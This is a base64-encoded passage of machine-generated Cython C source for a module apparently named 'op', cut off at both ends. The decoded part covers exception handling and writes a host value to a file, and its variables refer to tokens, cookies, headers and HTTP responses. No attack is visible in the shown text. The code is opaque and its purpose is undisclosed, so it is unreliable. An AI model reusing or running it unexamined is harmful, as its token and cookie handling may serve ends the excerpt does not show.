F0ZV9kZWNsYXJlXG4gICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2KTtcbiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fcHl4X3ZfZiA9IF9fcHl4X3RfNjtcbiAgICAgICAgICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgX19weXhfdF8xMiA9IF9fcHl4X3ZfZjtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl90bCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE1NSwgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfaG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1NSwgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xN1swXSA9IF9fcHl4X3RfNDtcbiAgICAgICAgICAgICAgX19weXhfdF8xN1sxXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzc7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTdbMl0gPSBfX3B5eF90Xzc7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTdbM10gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184O1xuICAgICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzE3LCA0LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNykgKyAxLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzcpKTtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTU1LCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMiwgX19weXhfdF81fTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd3JpdGUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1NSwgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICAgICAgICAgIFxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgZ290byBfX3B5eF9MMThfdHJ5X2VuZDtcbiAgICAgICAgICAgIF9fcHl4X0wxM19lcnJvcjo7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC50bGwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF82LCAmX19weXhfdF81LCAmX19weXhfdF8xMikgPCAwKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICAgICAgX19weXhfdF83ID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfNiwgX19weXhfdF81LCBfX3B5eF90XzEyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMywgX19weXhfdF83LCBOVUxMKTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE4KTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSAoIV9fcHl4X3RfMTkpO1xuICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8yMCkpIHtcbiAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF82LCBfX3B5eF90XzUsIF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7ICBfX3B5eF90XzUgPSAwOyAgX19weXhfdF8xMiA9IDA7IFxuICAgICAgICAgICAgICAgIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxNF9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X0wxNV9leGNlcHRfZXJyb3I6O1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xNCwgX19weXhfdF8xNSwgX19weXhfdF8xNik7XG4gICAgICAgICAgICBnb3RvIF9fcHl4X0wzX2Vycm9yO1xuICAgICAgICAgICAgX19weXhfTDE0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgX19weXhfTDE4X3RyeV9lbmQ6O1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICAge1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdLCBOVUxMKTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGdvdG8gX19weXhfTDEyO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF9MMTI6O1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gX19weXhfTDIyO1xuICAgICAgICBfX3B5eF9MOV9lcnJvcjo7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wyMjo7XG4gICAgICB9XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzIxID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgIGlmIChfX3B5eF90XzIxKSB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnRsbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xMiwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfNikgPCAwKSBfX1BZWF9FUlIoMCwgMTU2LCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzU7XG4gICAgICAge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzQgPSBOVUxMO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7XG4gICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3ZfZX07XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNTcsIF9fcHl4X0wyOF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF8xMCA9IE5VTEw7XG4gICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGxsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTU4LCBfX3B5eF9MMjhfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgICAgICAgIF9fcHl4X3RfMTAgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICAgIGFzc2VydChfX3B5eF90XzEwKTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgTlVMTH07XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDI4X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0wyOTtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MMjhfZXJyb3I6O1xuICAgICAgICB7XG4gICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICBfX3B5eF90XzEzID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMjQgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzE0LCAmX19weXhfdF8xOCwgJl9fcHl4X3RfMjQpO1xuICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEzLCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTUpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzEzLCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMyk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjQpO1xuICAgICAgICAgIF9fcHl4X3RfMjEgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMjIgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzIzID0gX19weXhfZmlsZW5hbWU7XG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjQpO1xuICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTgsIF9fcHl4X3RfMjQpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8xMywgX19weXhfdF8xNiwgX19weXhfdF8xNSk7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNCA9IDA7IF9fcHl4X3RfMTggPSAwOyBfX3B5eF90XzI0ID0gMDtcbiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzIxOyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yMjsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzIzO1xuICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0wyOTo7XG4gICAgICB9XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBfX3B5eF9MOF90cnlfZW5kOjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnRsbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfbjEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfbjIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZTMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl90b2spO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfY29va2llcyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdGwpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8yb3BfM3RsbF8yZ2VuZXJhdG9yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8yb3BfM3RsbF81Z2VuZXJhdG9yMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfZ2JfMm9wXzN0bGxfOGdlbmVyYXRvcjIpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJvcF81cmVzdChQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fc